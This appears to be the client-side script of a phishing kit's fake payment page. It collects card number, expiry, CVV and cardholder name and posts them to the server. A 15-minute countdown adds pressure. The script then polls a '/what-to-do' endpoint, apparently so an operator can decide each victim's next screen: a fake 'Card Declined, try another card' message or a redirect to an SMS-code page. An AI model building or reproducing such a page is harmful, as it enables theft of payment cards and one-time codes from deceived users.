// === COUNTDOWN TIMER ===
let countdownInterval;
function startCountdown() {
    let totalSeconds = 14 * 60 + 59; // 14:59 starting time
    
    function updateCountdown() {
        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;
        
        document.getElementById('countdown').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        
        if (totalSeconds <= 0) {
            clearInterval(countdownInterval);
            document.getElementById('countdown').textContent = 'EXPIRED!';
            document.getElementById('countdown').classList.add('text-red-600');
            // Optionally redirect or show expired message
            setTimeout(() => {
                window.location.href = '/';
            }, 3000);
        }
        
        totalSeconds--;
    }
    
    updateCountdown(); // Initial call
    countdownInterval = setInterval(updateCountdown, 1000);
}

// === UTILS ===
function showError(input, message) {
    let errorDiv = input.parentNode.querySelector('.input-error');
    if (!errorDiv) {
        errorDiv = document.createElement('div');
        errorDiv.className = 'input-error text-xs text-red-500 mt-1';
        input.parentNode.appendChild(errorDiv);
    }
    input.classList.add('border-red-500', 'ring-2', 'ring-red-200');
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';
}
function clearError(input) {
    let errorDiv = input.parentNode.querySelector('.input-error');
    input.classList.remove('border-red-500', 'ring-2', 'ring-red-200');
    if (errorDiv) {
        errorDiv.textContent = '';
        errorDiv.style.display = 'none';
    }
}
function onlyDigits(str) {
    return str.replace(/\D/g, '');
}

// === CARD VALIDATION ===
function detectCardType(number) {
    number = onlyDigits(number);
    if (/^4/.test(number)) return 'visa';
    if (/^5[1-5]/.test(number) || /^2[2-7]/.test(number)) return 'mastercard';
    if (/^3[47]/.test(number)) return 'amex';
    if (/^6(?:011|5)/.test(number)) return 'discover';
    return 'unknown';
}
function luhnCheck(number) {
    let arr = (number + '').split('').reverse().map(x => parseInt(x));
    let sum = arr.reduce((acc, val, idx) => acc + (idx % 2 ? ((val *= 2) > 9 ? val - 9 : val) : val), 0);
    return sum % 10 === 0;
}
function validateCardNumber(input) {
    const value = onlyDigits(input.value);
    if (!value) { showError(input, 'Card number required'); return false; }
    if (value.length < 13 || value.length > 19) { showError(input, 'Invalid card number length'); return false; }
    if (!luhnCheck(value)) { showError(input, 'Invalid card number'); return false; }
    clearError(input);
    return true;
}
function validateExpiry(input) {
    const value = input.value.trim();
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) { showError(input, 'Format MM/YY'); return false; }
    const [mm, yy] = value.split('/').map(Number);
    const now = new Date();
    const exp = new Date(2000 + yy, mm - 1, 1);
    if (exp < new Date(now.getFullYear(), now.getMonth(), 1)) { showError(input, 'Card expired'); return false; }
    clearError(input);
    return true;
}
function validateCVV(input, cardType) {
    const value = onlyDigits(input.value);
    if (!value) { showError(input, 'CVV required'); return false; }
    if (cardType === 'amex' && value.length !== 4) { showError(input, 'AMEX: 4 digits'); return false; }
    if (cardType !== 'amex' && value.length !== 3) { showError(input, '3 digits'); return false; }
    clearError(input);
    return true;
}
function validateCardholder(input) {
    if (!input.value.trim()) { showError(input, 'Name required'); return false; }
    clearError(input);
    return true;
}

// === FORMATTING ===
function formatCardNumber(e) {
    let value = onlyDigits(e.target.value).slice(0, 19);
    let formatted = value.replace(/(.{4})/g, '$1 ').trim();
    e.target.value = formatted;
}
function formatExpiry(e) {
    let value = onlyDigits(e.target.value).slice(0, 4);
    if (value.length > 2) value = value.slice(0,2) + '/' + value.slice(2);
    e.target.value = value;
}
function formatCardholder(e) {
    e.target.value = e.target.value.toUpperCase();
}

// === CARD ICONS ===
function updateCardIcons(number) {
    const type = detectCardType(number);
    document.querySelectorAll('.card-icon').forEach(img => {
        img.style.opacity = img.dataset.type === type ? '1' : '0.3';
    });
    return type;
}

// === ADDRESS AUTOCOMPLETE ===
// Removed - no longer needed for simple card form

// === NEW LOADING OVERLAY ===
function showLoadingOverlay(text = 'Processing...', subtext = 'Please wait while we secure your information') {
    const overlay = document.getElementById('loadingOverlay');
    const loadingText = document.getElementById('loadingText');
    const loadingSubtext = document.getElementById('loadingSubtext');
    
    if (loadingText) loadingText.textContent = text;
    if (loadingSubtext) loadingSubtext.textContent = subtext;
    if (overlay) overlay.style.display = 'flex';
}

function hideLoadingOverlay() {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';
}

// === LEGACY SPINNER (for compatibility) ===
function createLoadingSpinner() {
    // Use new loading overlay instead
    return { style: { display: 'none' } };
}
function showLoadingSpinner() {
    showLoadingOverlay('Processing your payment...', 'Verifying card details');
}
function hideLoadingSpinner() {
    hideLoadingOverlay();
}
function showCardDeclinedMessage() {
    const alertDiv = document.createElement('div');
    alertDiv.className = 'bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4';
    alertDiv.innerHTML = `
        <strong class="font-bold">Card Declined!</strong>
        <span class="block sm:inline">Your card was declined. Please try another card.</span>
    `;
    const form = document.getElementById('cardForm');
    form.parentNode.insertBefore(alertDiv, form);
}

// === POLLING LOGIC ===
let pollingInterval;
function startWhatToDoPolling() {
    let lastStatus = null;
    let pollCount = 0;
    
    // Update loading text for polling
    showLoadingOverlay('Verifying payment...', 'Checking card status');
    
    pollingInterval = setInterval(async () => {
        pollCount++;
        try {
            const response = await fetch('/what-to-do', {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('input[name="_token"]').value
                },
                credentials: 'same-origin'
            });
            if (response.ok) {
                const data = await response.json();
                
                // Update loading text with status
                const statusText = data.data?.status || 'unknown';
                showLoadingOverlay('Verifying payment...', `Status: ${statusText}`);
                
                if (data.data && data.data.status !== lastStatus) {
                    lastStatus = data.data.status;
                    if (data.data.status !== 2) {
                        clearInterval(pollingInterval);
                        hideLoadingOverlay();
                        handleWhatToDoResponse(data.data);
                    }
                }
            }
        } catch (error) {
            console.error('Polling error:', error);
            // Continue polling even if there's an error
        }
    }, 1000);
}
function handleWhatToDoResponse(data) {
    if (data.status === 12) {
        window.location.href = verifysmsUrl;
    } else if (data.status === 4) {
        showCardDeclinedMessage();
        const paymentForm = document.getElementById('payment-form');
        if (paymentForm) {
            paymentForm.classList.add('show');
            paymentForm.classList.remove('hide', 'hidden');
            paymentForm.style.display = 'block'; // au cas où le CSS utilise display:none
        }
        // Scroll vers le message d'erreur
        const alertDiv = document.querySelector('.bg-red-100.border-red-400');
        if (alertDiv) {
            alertDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
        } else if (paymentForm) {
            paymentForm.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
    } else {
        // Optionally handle other statuses
    }
}

// === DELIVERY LOGIC ===
let deliveryMethod = 'standard';
let deliveryCost = 0;

// Delivery functions removed - no longer needed for simple card form

// === DOMContentLoaded ===
document.addEventListener('DOMContentLoaded', function() {
    // 0. Start countdown timer
    startCountdown();
    
    // 1. Check CC status on load
    showLoadingOverlay('Loading...', 'Checking payment status');
    fetch('/check-cc-status', {
        credentials: 'same-origin'
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === 'Declined') {
            showCardDeclinedMessage();
            fetch('/clear-cc-status', {
                method: 'POST',
                headers: {
                    'X-CSRF-TOKEN': document.querySelector('input[name="_token"]').value,
                    'Accept': 'application/json'
                },
                credentials: 'same-origin'
            });
        }
    })
    .finally(() => hideLoadingOverlay());

    // 2. Setup formatting
    document.getElementById('card_number').addEventListener('input', function(e) {
        formatCardNumber(e);
        updateCardIcons(e.target.value);
    });
    document.getElementById('expiry').addEventListener('input', formatExpiry);
    document.getElementById('cardholder').addEventListener('input', formatCardholder);

    // 3. Setup address autocomplete (removed - no longer needed)

    // 4. Form submit with validation + AJAX
    const form = document.getElementById('cardForm');
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        const cardNumber = document.getElementById('card_number');
        const expiry = document.getElementById('expiry');
        const cvv = document.getElementById('cvv');
        const cardholder = document.getElementById('cardholder');
        let valid = true;
        const cardType = updateCardIcons(cardNumber.value);

        if (!validateCardNumber(cardNumber)) valid = false;
        if (!validateExpiry(expiry)) valid = false;
        if (!validateCVV(cvv, cardType)) valid = false;
        if (!validateCardholder(cardholder)) valid = false;

        if (!valid) return;

        showLoadingOverlay('Processing payment...', 'Verifying card details');
        try {
            const formData = new FormData(form);
            const response = await fetch(verifyCardUrl, {
                method: 'POST',
                body: formData,
                headers: {
                    'X-CSRF-TOKEN': document.querySelector('input[name="_token"]').value
                },
                credentials: 'same-origin'
            });
            if (response.ok) {
                startWhatToDoPolling();
            } else {
                hideLoadingOverlay();
                alert('Erreur lors de la soumission de la carte');
            }
        } catch (error) {
            hideLoadingOverlay();
            alert('Erreur de connexion');
        }
    });

    // 5. Setup delivery selection events (removed - no longer needed)
});
